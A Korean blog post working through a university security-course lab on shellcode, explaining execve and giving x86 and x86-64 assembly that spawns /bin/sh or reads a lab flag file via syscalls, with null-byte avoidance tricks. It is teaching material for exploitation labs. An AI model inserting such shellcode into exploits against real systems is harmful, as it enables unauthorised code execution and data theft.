---
layout: post
title:  "Shellcode란?"
date:   2020-12-30 20:19:35 +0900
categories: [ComputerArchitecture]
---

## Shellcode 튜토리얼
- 참고링크: [CS6265 튜토리얼](https://tc.gts3.org/cs6265/2020/tut/tut02-warmup2.html#shellcode)  
- 목표: interactive shell 실행
Shellcode란 기본적으로 시스템 해킹, [exploitation(취약점 공격)](https://ko.wikipedia.org/wiki/%EC%B7%A8%EC%95%BD%EC%A0%90_%EA%B3%B5%EA%B2%A9)을 위한 generic [payload](https://ko.wikipedia.org/wiki/%ED%8E%98%EC%9D%B4%EB%A1%9C%EB%93%9C_(%EC%BB%B4%ED%93%A8%ED%8C%85))이다. 

위 링크의 CS6265 튜토리얼에서는 우선 execve를 사용해서 현재 실행중인 프로세스를 바꿔서 정해진 flag를 출력하도록 합니다.

## execve란

`int execve(const char *filename, char *const argv[], char *const envp[]);`

이 함수는 현재 실행중인 프로세스의 실행코드를 실행가능한 파일인 filename로 바꿉니다. filename 프로그램의 코드를 메모리에 새로 load함으로써, 현재 실행 중인 프로세스의 기능이 filename의 것으로 완전히 바뀝니다. 그래서 기존 프로세스는 그대로 두면서 새로운 프로세스를 만드는 fork()와는 구별됩니다. 

위의 argv는 argument vector, envp는 environment입니다. argument가 배열 형태로 따라오고, 또 환경변수로도 따라옵니다. 

## shellcode에서 execve
### 32비트 코드
우선 32비트 버전입니다. 아래에 코드 1과 코드 2가 있는데, 코드 1을 수정해서 flag를 출력할 수 있도록 (코드 2로) 바꾸어야 합니다. 그 과정을 보면, 우선 `#define STRING`을 통해서 문자열을 하나 만듭니다. 그 문자열은 맨 아래의 `.string STRING`에 있습니다. 이게 특이한 부분인데 보통 실행코드가 위치해야 하는 어셈블리의 부분에 문자열이 있습니다.  
STRING을 코드 2와 같이 고치면 어떻게 될까요? 다른 부분도 고쳐야 하기는 하지만, 결론을 말하면 `/bin/sh`를 실행하던 코드가 `/bin/cat`을 실행하고, 그 `/bin/cat`의 argument로 `/proc/flag`를 넘겨줘서 flag가 출력됩니다. 

- 코드 1의 개요도
    ```
    +-------------+
    v             |
    [/bin/cat][0][ptr ][NULL]
                ^     ^     
                |     +-- envp
                +-- argv

    ```

- 코드 2의 개요도
    ```
    +----------------------------+
    |             +--------------=-----+
    v             v              |     |
    [/bin/cat][0][/proc/flag][0][ptr1][ptr2][NULL]
                                ^           ^
                                |           +-- envp
                                +-- argv

    ```

- 코드 1
    ```
    #include <sys/syscall.h>

    #define STRING  "/bin/sh"
    #define STRLEN  7
    #define ARGV    (STRLEN+1)
    #define ENVP    (ARGV+4)

    .intel_syntax noprefix
    .text

    .globl main
    .type  main, @function

    main:
    jmp     calladdr

    popladdr:
    pop    esi                    /* esi points to STRING */
    mov    [ARGV+esi],esi         /* set up argv[0] pointer to pathname */
    xor    eax,eax                /* get a 32-bit zero value */
    mov    [STRLEN + esi],al      /* null-terminate our string */
    mov    [ENVP + esi], eax      /* set up null envp */

    mov    al,SYS_execve          /* syscall number */
    mov    ebx,esi                /* arg 1: string pathname */
    lea    ecx,[ARGV + esi]       /* arg 2: argv */
    lea    edx,[ENVP + esi]       /* arg 3: envp */
    int    0x80                   /* execve("/bin/sh", ["/bin/sh", NULL], [NULL]) */

    xor    ebx,ebx                /* arg 1: 0 */
    mov    eax,ebx
    inc    eax                    /* exit(0) */
    /* mov+inc to avoid null byte */
    int    0x80                   /* invoke syscall */

    calladdr:
    call    popladdr
    .string STRING

    ```

- 코드 2
    ```
    #include <sys/syscall.h>

    #define STRING  "/bin/catN/proc/flag"
    #define STRLEN1 8
    #define STRLEN2 19
    #define ARGV    (STRLEN2+1)
    #define ENVP    (ARGV+8)

    .intel_syntax noprefix
    .text
        
    .globl main
    .type  main, @function

    main:
    jmp     calladdr

    popladdr:
    pop    esi                    /* esi points to STRING */
    mov    edi, esi
    add    edi, STRLEN1+1

    mov    [ARGV+esi],esi         /* set up argv[0] pointer to pathname */
    mov    [ARGV+4+esi], edi

    xor    eax,eax                /* get a 32-bit zero value */
    mov    [STRLEN1 + esi],al      /* null-terminate our string */
    mov    [STRLEN2 + esi],al      /* null-terminate our string */
    mov    [ENVP + esi], eax      /* set up null envp */
    
    mov    al,SYS_execve          /* syscall number */
    mov    ebx,esi                /* arg 1: string pathname */
    lea    ecx,[ARGV + esi]       /* arg 2: argv */
    lea    edx,[ENVP + esi]       /* arg 3: envp */
    int    0x80                   /* execve("/bin/sh", ["/bin/sh", NULL], [NULL]) */
    
    xor    ebx,ebx                /* arg 1: 0 */
    mov    eax,ebx
    inc    eax                    /* exit(0) */
    /* mov+inc to avoid null byte */
    int    0x80                   /* invoke syscall */

    calladdr:
    call    popladdr
    .string STRING

    ```

### 64비트 코드
64비트 코드도 원리는 같습니다. 다만 레지스터들이 rdi, rsi, rdx, ... 하는 식으로 바뀌고, 주소값이 64비트로 바뀌고, `int 80` 대신 `syscall`을 이용하는 등의 차이가 있습니다. (`int 80`은 먹히기는 하는데 `syscall`이 더 빨라서, 64비트 머신에서는 `syscall`이 권장된다고 합니다.) 아래 코드에 해당하는 문제는 위의 코드와는 살짝 다른데, 이번에는 `/bin/cat`을 통해서 출력하는 게 아니라 `/proc/flag`를 직접 open, read, write 하는 문제입니다. 여기서 buf는 메모리의 어떤 곳으로 해당 flag를 read할 때 필요합니다. $rsp-0x500으로 임의로 정했는데 잘 작동합니다. 

```
#include <sys/syscall.h>

#define STRING  "/proc/flag"

.intel_syntax noprefix
.text

.globl main
.type  main, @function

main:
  jmp     calladdr

popladdr:
  pop    r8                    /* r10 points to STRING */

  xor    rax,rax                /* get a 64-bit zero value */
  xor    rdi,rdi                /* get a 64-bit zero value */
  xor    rsi,rsi                /* get a 64-bit zero value */
  xor    rdx,rdx                /* get a 64-bit zero value */

  push   r8

  mov    rax,0x2               /* syscall number of open */
  mov    rsi,0x0                /* arg 2: flag */
  mov    rdi,r8                 /* arg 1: string filename */
  xor    rdx,rdx                /* arg 3: int flags */
  syscall                       /* openat(0, "/proc/flag", 0) */

  mov    rdi,rax                /* arg 1: fd */
  mov    rsi,rsp                /* arg 2: buf */
  sub    rsi, 0x500
  mov    rax,0x0                /* syscall number of read */
  mov    rdx,0x418              /* arg 3: count */
  syscall

  mov    rax,0x1                 /* syscall number of write */
  mov    rdi,0x1                 /* arg 1: stdout */
  mov    rsi,rsi                 /* arg 2: buf */
  mov    rdx,0x418               /* arg 3: length of string to read */
  syscall

  xor    rdi,rdi               /* arg 1: 0 */
  mov    rax,rdi
  mov    rax,0x3c                    /* exit(0) */
  /* mov+inc to avoid null byte */
  syscall                   /* invoke syscall */

calladdr:
  call    popladdr
  .string STRING

```

## 유용한 명령어들
- `strace`, `ltrace` : system call 내역을 나열합니다. 